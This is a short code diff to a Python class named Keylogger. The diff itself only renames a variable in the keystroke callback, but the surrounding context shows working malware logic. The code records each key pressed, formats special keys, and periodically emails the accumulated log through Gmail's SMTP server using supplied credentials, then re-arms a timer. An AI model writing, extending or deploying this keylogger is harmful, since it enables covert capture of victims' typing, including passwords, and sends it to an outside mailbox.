@@ -25,18 +25,20 @@ class Keylogger:
         self.semaphore = Semaphore(0)
 
     def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
+        key = event.name
+
+        if len(key) > 1:
+            if key == "space":
+                key = " "
+            elif key == "enter":
+                key = "[ENTER]\n"
+            elif key == "decimal":
+                key = "."
             else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        self.log += name
+                key = key.replace(" ", "_")
+                key = f"[{key.upper()}]"
+
+        self.log += key
 
     def sendmail(self, email, password, message):
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
@@ -57,6 +59,7 @@ class Keylogger:
             text = msg.as_string()
 
             self.sendmail(email, password, text)
+            
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
 
